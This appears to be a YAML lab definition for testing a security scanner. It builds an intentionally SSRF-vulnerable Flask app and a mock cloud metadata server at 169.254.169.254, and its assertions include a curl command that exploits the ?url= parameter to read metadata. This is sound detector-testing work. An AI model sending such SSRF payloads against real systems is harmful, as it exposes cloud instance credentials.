name: ssrf-url-fetch
description: "Flask app with SSRF in ?url= parameter + mock cloud metadata at 169.254.169.254 — beacon ssrf scanner detects cloud metadata access"
tags: [ssrf, scanner, web, authorized]

services:
  metadata:
    image: nginx:alpine
    volumes:
      - ./ssrf/metadata.conf:/etc/nginx/conf.d/default.conf:ro
    networks:
      ssrf-net:
        ipv4_address: 169.254.169.254

  ssrf-app:
    build:
      context: ./ssrf
      dockerfile: Dockerfile
    ports: ["9220:8080"]
    networks:
      ssrf-net: {}
    depends_on:
      - metadata

networks:
  ssrf-net:
    ipam:
      config:
        - subnet: 169.254.169.0/24

ready:
  cmd: "curl -sf http://localhost:9220/health >/dev/null"
  timeout: 60s
  interval: 2s

assertions:
  - name: exploit-ssrf-metadata-fetch
    type: command
    expect:
      command: "curl -sf 'http://localhost:9220/?url=http://169.254.169.254/latest/meta-data/' | grep -q ami-id"
      exit_code: 0

  - name: detects-ssrf
    type: beacon
    target: localhost:9220
    args: ["--no-enrich", "--scanners", "ssrf", "--deep", "--permission-confirmed", "--authorized"]
    expect:
      check_id: web.ssrf

timeout: 5m
